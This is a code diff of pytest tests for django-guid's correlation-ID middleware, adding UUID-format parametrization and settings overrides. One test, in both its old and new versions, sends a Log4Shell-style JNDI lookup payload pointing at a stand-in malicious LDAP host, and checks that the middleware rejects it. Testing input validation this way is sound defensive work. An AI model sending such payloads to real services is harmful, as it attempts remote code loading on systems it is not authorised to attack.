@@ -8,7 +8,11 @@ import pytest
 from django_guid.config import Settings
 
 
-def test_request_with_no_correlation_id(client, caplog, mock_uuid):
+@pytest.mark.parametrize(
+    'uuid_data,uuid_format',
+    [('704ae5472cae4f8daa8f2cc5a5a8mock', 'hex'), ('704ae547-2cae-4f8d-aa8f-2cc5a5a8mock', 'string')],
+)
+def test_request_with_no_correlation_id(uuid_data, uuid_format, client, caplog, mock_uuid, monkeypatch):
     """
     Tests a request without any correlation-ID in it logs the correct things.
     In this case, it means that the first log message should not have any correlation-ID in it, but the next two
@@ -17,58 +21,81 @@ def test_request_with_no_correlation_id(client, caplog, mock_uuid):
     :param client: Django client
     :param caplog: caplog fixture
     """
-    response = client.get('/')
+    mocked_settings = {'GUID_HEADER_NAME': 'Correlation-ID', 'VALIDATE_GUID': False, 'UUID_FORMAT': uuid_format}
+
+    with override_settings(DJANGO_GUID=mocked_settings):
+        settings = Settings()
+        monkeypatch.setattr('django_guid.utils.settings', settings)
+        response = client.get('/')
+
     expected = [
         ('sync middleware called', None),
         (
-            'Header `Correlation-ID` was not found in the incoming request. '
-            'Generated new GUID: 704ae5472cae4f8daa8f2cc5a5a8mock',
+            'Header `Correlation-ID` was not found in the incoming request. ' f'Generated new GUID: {uuid_data}',
             None,
         ),
-        ('This log message should have a GUID', '704ae5472cae4f8daa8f2cc5a5a8mock'),
-        ('Some warning in a function', '704ae5472cae4f8daa8f2cc5a5a8mock'),
-        ('Received signal `request_finished`, clearing guid', '704ae5472cae4f8daa8f2cc5a5a8mock'),
+        ('This log message should have a GUID', uuid_data),
+        ('Some warning in a function', uuid_data),
+        ('Received signal `request_finished`, clearing guid', uuid_data),
     ]
     assert [(x.message, x.correlation_id) for x in caplog.records] == expected
-    assert response['Correlation-ID'] == '704ae5472cae4f8daa8f2cc5a5a8mock'
+    assert response['Correlation-ID'] == uuid_data
 
 
-def test_request_with_correlation_id(client, caplog):
+@pytest.mark.parametrize(
+    'uuid_data,uuid_format',
+    [('97c304252fd14b25b72d6aee31565843', 'hex'), ('97c30425-2fd1-4b25-b72d-6aee31565843', 'string')],
+)
+def test_request_with_correlation_id(uuid_data, uuid_format, client, caplog, monkeypatch):
     """
     Tests a request _with_ a correlation-ID in it logs the correct things.
     :param client: Django client
     :param caplog: caplog fixture
     """
-    response = client.get('/', **{'HTTP_Correlation-ID': '97c304252fd14b25b72d6aee31565843'})
+    mocked_settings = {'GUID_HEADER_NAME': 'Correlation-ID', 'UUID_FORMAT': uuid_format}
+
+    with override_settings(DJANGO_GUID=mocked_settings):
+        settings = Settings()
+        monkeypatch.setattr('django_guid.utils.settings', settings)
+        response = client.get('/', **{'HTTP_Correlation-ID': uuid_data})
     expected = [
         ('sync middleware called', None),
         ('Correlation-ID found in the header', None),
-        ('97c304252fd14b25b72d6aee31565843 is a valid GUID', None),
-        ('This log message should have a GUID', '97c304252fd14b25b72d6aee31565843'),
-        ('Some warning in a function', '97c304252fd14b25b72d6aee31565843'),
-        ('Received signal `request_finished`, clearing guid', '97c304252fd14b25b72d6aee31565843'),
+        (f'{uuid_data} is a valid GUID', None),
+        ('This log message should have a GUID', uuid_data),
+        ('Some warning in a function', uuid_data),
+        ('Received signal `request_finished`, clearing guid', uuid_data),
     ]
     assert [(x.message, x.correlation_id) for x in caplog.records] == expected
-    assert response['Correlation-ID'] == '97c304252fd14b25b72d6aee31565843'
+    assert response['Correlation-ID'] == uuid_data
 
 
-def test_request_with_non_alnum_correlation_id(client, caplog, mock_uuid):
+@pytest.mark.parametrize(
+    'uuid_data,uuid_format',
+    [('704ae5472cae4f8daa8f2cc5a5a8mock', 'hex'), ('704ae547-2cae-4f8d-aa8f-2cc5a5a8mock', 'string')],
+)
+def test_request_with_non_alnum_correlation_id(uuid_data, uuid_format, client, caplog, mock_uuid, monkeypatch):
     """
     Tests a request _with_ a correlation-ID in it logs the correct things.
     :param client: Django client
     :param caplog: caplog fixture
     """
-    response = client.get('/', **{'HTTP_Correlation-ID': '!"#¤&${jndi:ldap://ondsinnet.no/a}'})
+    mocked_settings = {'GUID_HEADER_NAME': 'Correlation-ID', 'UUID_FORMAT': uuid_format}
+
+    with override_settings(DJANGO_GUID=mocked_settings):
+        settings = Settings()
+        monkeypatch.setattr('django_guid.utils.settings', settings)
+        response = client.get('/', **{'HTTP_Correlation-ID': '!"#¤&${jndi:ldap://ondsinnet.no/a}'})
     expected = [
         ('sync middleware called', None),
         ('Correlation-ID found in the header', None),
-        ('Non-alnum Correlation-ID provided. New GUID is 704ae5472cae4f8daa8f2cc5a5a8mock', None),
-        ('This log message should have a GUID', '704ae5472cae4f8daa8f2cc5a5a8mock'),
-        ('Some warning in a function', '704ae5472cae4f8daa8f2cc5a5a8mock'),
-        ('Received signal `request_finished`, clearing guid', '704ae5472cae4f8daa8f2cc5a5a8mock'),
+        (f'Non-alnum Correlation-ID provided. New GUID is {uuid_data}', None),
+        ('This log message should have a GUID', uuid_data),
+        ('Some warning in a function', uuid_data),
+        ('Received signal `request_finished`, clearing guid', uuid_data),
     ]
     assert [(x.message, x.correlation_id) for x in caplog.records] == expected
-    assert response['Correlation-ID'] == '704ae5472cae4f8daa8f2cc5a5a8mock'
+    assert response['Correlation-ID'] == uuid_data
 
 
 def test_request_with_invalid_correlation_id(client, caplog, mock_uuid):
